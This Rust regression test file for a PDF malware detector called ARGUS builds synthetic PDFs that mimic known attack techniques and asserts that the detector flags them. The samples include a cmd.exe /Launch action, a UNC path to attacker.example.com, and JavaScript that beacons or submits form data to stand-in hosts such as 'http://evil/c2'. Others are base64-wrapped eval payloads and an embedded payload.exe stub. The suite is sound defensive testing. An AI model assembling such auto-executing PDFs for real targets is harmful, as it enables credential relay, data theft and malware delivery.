//! TTP-coverage regression suite — **malicious-pdf family** synthetic shapes.
//!
//! Builds minimal-but-valid PDFs in-memory matching the documented TTP set
//! from `jonaslejon/malicious-pdf` (48 generators × 5 obfuscation levels in
//! the upstream corpus). Runs each through the full ARGUS pipeline and
//! asserts the expected detection floor + the specific finding fires.
//!
//! These tests do NOT require the upstream generator — every PDF is
//! constructed from the documented action types and JS API set. They
//! function as the regression suite for future weight/threshold tuning:
//! when we wire a real-corpus eval, these stay green to prove we haven't
//! regressed on the documented action/JS surface.

use argus::verdict::Verdict;
use argus::{ArgusConfig, ArgusEngine};
use lopdf::content::{Content, Operation};
use lopdf::{Dictionary, Document, Object, Stream};

/// Build a minimal valid PDF with a catalog that includes the given
/// `OpenAction` (or no action if `None`). Returns serialized bytes.
fn build_pdf_with_open_action(action: Option<Dictionary>) -> Vec<u8> {
    let mut doc = Document::with_version("1.7");

    let resources_id = doc.add_object(Dictionary::new());

    let content = Content {
        operations: vec![Operation::new("BT", vec![Object::Real(0.0)])],
    };
    let content_id = doc.add_object(Stream::new(
        Dictionary::new(),
        content.encode().unwrap_or_default(),
    ));

    let mut page = Dictionary::new();
    page.set("Type", "Page");
    page.set("MediaBox", vec![0.into(), 0.into(), 612.into(), 792.into()]);
    page.set("Resources", resources_id);
    page.set("Contents", content_id);

    // Pages is forward-referenced; allocate, fill, replace.
    let pages_id = doc.new_object_id();
    page.set("Parent", pages_id);
    let page_id = doc.add_object(page);

    let mut pages = Dictionary::new();
    pages.set("Type", "Pages");
    pages.set("Kids", vec![page_id.into()]);
    pages.set("Count", 1);
    doc.objects.insert(pages_id, Object::Dictionary(pages));

    let mut catalog = Dictionary::new();
    catalog.set("Type", "Catalog");
    catalog.set("Pages", pages_id);
    if let Some(action_dict) = action {
        let action_id = doc.add_object(action_dict);
        catalog.set("OpenAction", action_id);
    }
    let catalog_id = doc.add_object(catalog);

    doc.trailer.set("Root", catalog_id);

    let mut buf: Vec<u8> = Vec::new();
    doc.save_to(&mut buf).unwrap();
    buf
}

/// Build a PDF whose catalog OpenAction is a /JavaScript action with the
/// given JS source.
fn build_pdf_with_js(js: &str) -> Vec<u8> {
    let js_stream_dict = Dictionary::new();
    let js_stream = Stream::new(js_stream_dict, js.as_bytes().to_vec());

    let mut doc = Document::with_version("1.7");

    let js_id = doc.add_object(js_stream);

    let mut action = Dictionary::new();
    action.set("Type", "Action");
    action.set("S", "JavaScript");
    action.set("JS", js_id);
    let action_id = doc.add_object(action);

    let resources_id = doc.add_object(Dictionary::new());
    let content_id = doc.add_object(Stream::new(Dictionary::new(), b"".to_vec()));

    let pages_id = doc.new_object_id();
    let mut page = Dictionary::new();
    page.set("Type", "Page");
    page.set("MediaBox", vec![0.into(), 0.into(), 612.into(), 792.into()]);
    page.set("Resources", resources_id);
    page.set("Contents", content_id);
    page.set("Parent", pages_id);
    let page_id = doc.add_object(page);

    let mut pages = Dictionary::new();
    pages.set("Type", "Pages");
    pages.set("Kids", vec![page_id.into()]);
    pages.set("Count", 1);
    doc.objects.insert(pages_id, Object::Dictionary(pages));

    let mut catalog = Dictionary::new();
    catalog.set("Type", "Catalog");
    catalog.set("Pages", pages_id);
    catalog.set("OpenAction", action_id);
    let catalog_id = doc.add_object(catalog);
    doc.trailer.set("Root", catalog_id);

    let mut buf: Vec<u8> = Vec::new();
    doc.save_to(&mut buf).unwrap();
    buf
}

/// Build a PDF that embeds a file in /Names /EmbeddedFiles.
fn build_pdf_with_embedded_file(filename: &str, file_bytes: &[u8]) -> Vec<u8> {
    let mut doc = Document::with_version("1.7");

    // The embedded file stream (the actual file content).
    let mut ef_stream_dict = Dictionary::new();
    ef_stream_dict.set("Type", "EmbeddedFile");
    let ef_stream_id = doc.add_object(Stream::new(ef_stream_dict, file_bytes.to_vec()));

    // The file specification dict pointing to the EF stream.
    let mut ef_subdict = Dictionary::new();
    ef_subdict.set("F", ef_stream_id);
    let mut filespec = Dictionary::new();
    filespec.set("Type", "Filespec");
    filespec.set("F", Object::string_literal(filename));
    filespec.set("EF", ef_subdict);
    let filespec_id = doc.add_object(filespec);

    // Name tree leaf — pair of (name, filespec).
    let mut name_tree = Dictionary::new();
    name_tree.set(
        "Names",
        vec![
            Object::string_literal(filename),
            Object::Reference(filespec_id),
        ],
    );

    let mut names = Dictionary::new();
    names.set("EmbeddedFiles", name_tree);

    // Minimal pages structure.
    let resources_id = doc.add_object(Dictionary::new());
    let content_id = doc.add_object(Stream::new(Dictionary::new(), b"".to_vec()));
    let pages_id = doc.new_object_id();
    let mut page = Dictionary::new();
    page.set("Type", "Page");
    page.set("MediaBox", vec![0.into(), 0.into(), 612.into(), 792.into()]);
    page.set("Resources", resources_id);
    page.set("Contents", content_id);
    page.set("Parent", pages_id);
    let page_id = doc.add_object(page);
    let mut pages = Dictionary::new();
    pages.set("Type", "Pages");
    pages.set("Kids", vec![page_id.into()]);
    pages.set("Count", 1);
    doc.objects.insert(pages_id, Object::Dictionary(pages));

    let mut catalog = Dictionary::new();
    catalog.set("Type", "Catalog");
    catalog.set("Pages", pages_id);
    catalog.set("Names", names);
    let catalog_id = doc.add_object(catalog);
    doc.trailer.set("Root", catalog_id);

    let mut buf: Vec<u8> = Vec::new();
    doc.save_to(&mut buf).unwrap();
    buf
}

fn score(pdf: &[u8], name: &str) -> argus::ArgusVerdict {
    let engine = ArgusEngine::new(ArgusConfig::default());
    engine.analyze_buffer(name, pdf)
}

// ──────────────────────────────────────────────────────────────────
//  /Launch action — direct executable launch
// ──────────────────────────────────────────────────────────────────
#[test]
fn launch_action_floor() {
    let mut action = Dictionary::new();
    action.set("Type", "Action");
    action.set("S", "Launch");
    action.set("F", Object::string_literal("cmd.exe"));
    let pdf = build_pdf_with_open_action(Some(action));

    let v = score(&pdf, "launch.pdf");
    eprintln!("[launch] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("/Launch action")),
        "launch action finding expected: {descs:?}");
    assert!(descs.iter().any(|d| d.contains("automatically on open")),
        "auto-action finding expected: {descs:?}");
    assert!(v.score >= 26, "launch+auto-action should score Suspicious; got {}", v.score);
}

// ──────────────────────────────────────────────────────────────────
//  /GoToE with UNC — SMB NTLM relay surface
// ──────────────────────────────────────────────────────────────────
#[test]
fn gotoe_unc_floor() {
    let mut action = Dictionary::new();
    action.set("Type", "Action");
    action.set("S", "GoToE");
    action.set("F", Object::string_literal("\\\\attacker.example.com\\share\\evil.pdf"));
    let pdf = build_pdf_with_open_action(Some(action));

    let v = score(&pdf, "gotoe.pdf");
    eprintln!("[gotoe-unc] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("/GoToE")),
        "GoToE UNC finding expected: {descs:?}");
    assert!(v.score >= 26, "GoToE+UNC must score >= Suspicious; got {}", v.score);
}

// ──────────────────────────────────────────────────────────────────
//  /URI to suspicious target (javascript:, IP literal, ftp://)
// ──────────────────────────────────────────────────────────────────
#[test]
fn uri_to_suspicious_target_flagged() {
    let mut action = Dictionary::new();
    action.set("Type", "Action");
    action.set("S", "URI");
    action.set("URI", Object::string_literal("http://192.168.1.100/c2"));
    let pdf = build_pdf_with_open_action(Some(action));

    let v = score(&pdf, "uri.pdf");
    eprintln!("[uri-ip] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("/URI action targets a non-HTTPS")),
        "suspicious URI finding expected: {descs:?}");
}

// ──────────────────────────────────────────────────────────────────
//  JS calling app.launchURL — callback channel
// ──────────────────────────────────────────────────────────────────
#[test]
fn js_app_launch_url_floor() {
    let pdf = build_pdf_with_js("app.launchURL('http://evil.example.com/track?id=victim');");
    let v = score(&pdf, "launch-url.pdf");
    eprintln!("[js-launchURL] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("app.launchURL")),
        "app.launchURL finding expected: {descs:?}");
    assert!(v.score >= 26, "JS+auto-action should score >= Suspicious; got {}", v.score);
}

// ──────────────────────────────────────────────────────────────────
//  JS with network callback (XMLHttpRequest)
// ──────────────────────────────────────────────────────────────────
#[test]
fn js_xhr_callback_floor() {
    let pdf = build_pdf_with_js(
        "var x = new XMLHttpRequest(); x.open('POST', 'http://evil/c2'); x.send('beacon');",
    );
    let v = score(&pdf, "xhr.pdf");
    eprintln!("[js-xhr] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("network connections")),
        "JS network-callback finding expected: {descs:?}");
}

// ──────────────────────────────────────────────────────────────────
//  JS with this.submitForm — form data exfiltration
// ──────────────────────────────────────────────────────────────────
#[test]
fn js_submit_form_floor() {
    let pdf = build_pdf_with_js("this.submitForm({cURL:'http://attacker/x',cSubmitAs:'HTML'});");
    let v = score(&pdf, "submit.pdf");
    eprintln!("[js-submit] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("submitForm")),
        "submitForm finding expected: {descs:?}");
}

// ──────────────────────────────────────────────────────────────────
//  Obfuscation level 4 — eval(atob(...)) wrapper
// ──────────────────────────────────────────────────────────────────
#[test]
fn js_obfuscation_level4_floor() {
    let pdf = build_pdf_with_js(
        "eval(atob('YXBwLmxhdW5jaFVSTCgnaHR0cDovL2V2aWwnKQ=='));",
    );
    let v = score(&pdf, "obfuscated.pdf");
    eprintln!("[js-obf4] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("eval(atob")),
        "obfuscation wrapper finding expected: {descs:?}");
    assert!(v.score >= 26, "obfuscation-wrapper PDF must score Suspicious; got {}", v.score);
}

// ──────────────────────────────────────────────────────────────────
//  Embedded executable (.exe in /EmbeddedFiles)
// ──────────────────────────────────────────────────────────────────
#[test]
fn embedded_executable_flagged() {
    let pdf = build_pdf_with_embedded_file("payload.exe", b"MZ\x90\x00synthetic-pe-payload");
    let v = score(&pdf, "dropper.pdf");
    eprintln!("[embedded-exe] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    let descs: Vec<&str> = v.findings.iter().map(|f| f.description.as_str()).collect();
    assert!(descs.iter().any(|d| d.contains("embeds an executable")),
        "embedded-executable finding expected: {descs:?}");
}

// ──────────────────────────────────────────────────────────────────
//  Multi-trigger PDF — Launch + GoToE UNC + obfuscated JS + embedded exe
//  → unambiguously hostile, should score Malicious from PDF layer alone
// ──────────────────────────────────────────────────────────────────
#[test]
fn multi_trigger_pdf_malicious() {
    // We can't easily compose all four into one valid PDF via the helpers
    // above — but we CAN combine JS obfuscation + auto-launch JS (covers
    // ScriptAnalysis cap) + embedded executable (covers Structural cap),
    // which exercises the cross-layer combination.
    let js = "eval(atob('Y29uc3QgeCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4Lm9wZW4oJ1BPU1QnLCAnaHR0cDovL2V2aWwvYzInKTsgeC5zZW5kKCdiZWFjb24nKTsgYXBwLmxhdW5jaFVSTCgnaHR0cDovL2V2aWwnKTsgdGhpcy5zdWJtaXRGb3JtKCk7'));";

    // Build a PDF that has the JS OpenAction *and* an embedded executable.
    let mut doc = Document::with_version("1.7");

    let js_stream = Stream::new(Dictionary::new(), js.as_bytes().to_vec());
    let js_id = doc.add_object(js_stream);

    let mut action = Dictionary::new();
    action.set("Type", "Action");
    action.set("S", "JavaScript");
    action.set("JS", js_id);
    let action_id = doc.add_object(action);

    // Embedded file.
    let mut ef_stream_dict = Dictionary::new();
    ef_stream_dict.set("Type", "EmbeddedFile");
    let ef_id = doc.add_object(Stream::new(
        ef_stream_dict,
        b"MZ\x90\x00synthetic-pe-payload".to_vec(),
    ));
    let mut ef_sub = Dictionary::new();
    ef_sub.set("F", ef_id);
    let mut filespec = Dictionary::new();
    filespec.set("Type", "Filespec");
    filespec.set("F", Object::string_literal("payload.exe"));
    filespec.set("EF", ef_sub);
    let filespec_id = doc.add_object(filespec);

    let mut name_tree = Dictionary::new();
    name_tree.set(
        "Names",
        vec![
            Object::string_literal("payload.exe"),
            Object::Reference(filespec_id),
        ],
    );
    let mut names = Dictionary::new();
    names.set("EmbeddedFiles", name_tree);

    let resources_id = doc.add_object(Dictionary::new());
    let content_id = doc.add_object(Stream::new(Dictionary::new(), b"".to_vec()));
    let pages_id = doc.new_object_id();
    let mut page = Dictionary::new();
    page.set("Type", "Page");
    page.set("MediaBox", vec![0.into(), 0.into(), 612.into(), 792.into()]);
    page.set("Resources", resources_id);
    page.set("Contents", content_id);
    page.set("Parent", pages_id);
    let page_id = doc.add_object(page);
    let mut pages = Dictionary::new();
    pages.set("Type", "Pages");
    pages.set("Kids", vec![page_id.into()]);
    pages.set("Count", 1);
    doc.objects.insert(pages_id, Object::Dictionary(pages));

    let mut catalog = Dictionary::new();
    catalog.set("Type", "Catalog");
    catalog.set("Pages", pages_id);
    catalog.set("OpenAction", action_id);
    catalog.set("Names", names);
    let catalog_id = doc.add_object(catalog);
    doc.trailer.set("Root", catalog_id);

    let mut buf: Vec<u8> = Vec::new();
    doc.save_to(&mut buf).unwrap();

    let v = score(&buf, "multi.pdf");
    eprintln!(
        "[multi-trigger] score={} verdict={:?} findings={}",
        v.score,
        v.verdict,
        v.findings.len()
    );

    // Multi-trigger should hit ScriptAnalysis (obf wrapper + launchURL +
    // XHR + submitForm — but those dedup somewhat) + Structural (embedded
    // exec + auto-action). Floor: HighSuspicion.
    assert!(
        v.score >= 51,
        "Multi-trigger malicious PDF must score >= HighSuspicion; got {}",
        v.score
    );
}

// ──────────────────────────────────────────────────────────────────
//  Clean PDF — minimal valid PDF with no actions, no JS.
//  Must produce zero findings.
// ──────────────────────────────────────────────────────────────────
#[test]
fn clean_pdf_zero_findings() {
    let pdf = build_pdf_with_open_action(None);
    let v = score(&pdf, "clean.pdf");
    eprintln!("[clean] score={} verdict={:?} findings={}", v.score, v.verdict, v.findings.len());

    assert_eq!(
        v.score, 0,
        "Clean PDF must score 0; got {} with findings {:?}",
        v.score, v.findings
    );
    assert_eq!(v.verdict, Verdict::Clean);
}
